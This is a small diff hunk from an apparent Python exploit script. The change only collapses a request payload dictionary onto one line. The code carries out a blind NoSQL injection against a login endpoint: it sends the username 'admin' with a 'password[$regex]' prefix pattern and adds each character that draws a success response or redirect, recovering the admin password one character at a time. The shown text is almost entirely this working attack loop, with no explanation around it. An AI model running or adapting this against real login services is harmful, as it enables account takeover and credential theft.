@@ -262,10 +262,7 @@ password = ""
 while True:
     found = False
     for c in charset:
-        payload = {
-            "username": "admin",
-            "password[$regex]": f"^{password}{c}.*"
-        }
+        payload = {"username": "admin", "password[$regex]": f"^{password}{c}.*"}
         r = requests.post(url, json=payload)
         if "success" in r.text or r.status_code == 302:
             password += c
